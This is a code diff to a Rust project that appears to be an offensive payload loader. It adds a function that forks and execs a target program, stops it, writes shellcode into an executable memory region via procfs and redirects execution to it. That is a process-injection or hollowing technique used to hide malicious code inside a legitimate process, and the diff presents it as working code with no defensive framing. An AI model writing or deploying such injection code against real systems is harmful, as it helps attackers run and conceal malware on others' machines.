@@ -4,12 +4,16 @@ use std::ffi::CString;
 use std::os::fd::AsRawFd;
 
 use exeutils::elf64;
+
 use nix::sys::memfd::{memfd_create, MemFdCreateFlag};
 use nix::sys::ptrace;
+use nix::sys::signal::kill;
+use nix::sys::signal::Signal::{SIGCONT, SIGSTOP};
 use nix::unistd::{self, execve, fexecve, fork, ForkResult};
 
 use crate::error::{Error, Result};
 use crate::payload::{Payload, PayloadType, Spawn};
+use crate::primitives::procfs::{find_mem_region, mem_exec, mem_write};
 use crate::primitives::ptrace::ptace_write_rip;
 use crate::utils::{get_env, str_to_vec_c_string};
 
@@ -61,6 +65,52 @@ pub fn memfd(payload: Payload<Spawn>) -> Result<()> {
         Ok(ForkResult::Child) => {
             fexecve(fd.as_raw_fd(), args_slice, env_slice)?;
         }
+        Err(error) => return Err(Error::Linux(error)),
+    }
+
+    Ok(())
+}
+
+pub fn procfs_overwrite_rip(payload: Payload<Spawn>) -> Result<()> {
+    match unsafe { fork() } {
+        Ok(ForkResult::Parent { child, .. }) => match payload.payload_type() {
+            PayloadType::Executable => {
+                return Err(Error::NotImplemented(
+                    "hollow can not take executables".to_string(),
+                ));
+            }
+            PayloadType::Shellcode => {
+                // Stop the target process
+                kill(child, SIGSTOP)?;
+
+                // Find an executable memory region
+                // ptrace and procfs mem can bypass memory permission
+                // and write to non-writable memory
+                let addr = find_mem_region(child, true, "r-x")?[0];
+
+                // Write payload to executable memory
+                mem_write(child, addr, payload.bytes())?;
+
+                // Jump to payload
+                mem_exec(child, addr)?;
+
+                // Continue the target process
+                kill(child, SIGCONT)?;
+            }
+        },
+
+        Ok(ForkResult::Child) => {
+            let target_c_string = CString::new(payload.target())?;
+
+            let target_args = str_to_vec_c_string(payload.target_args())?;
+            let target_args_slice = target_args.as_slice();
+
+            let env = get_env()?;
+            let env_slice = env.as_slice();
+
+            execve(&target_c_string, target_args_slice, env_slice)?;
+        }
+
         Err(error) => return Err(Error::Linux(error)),
     }
 
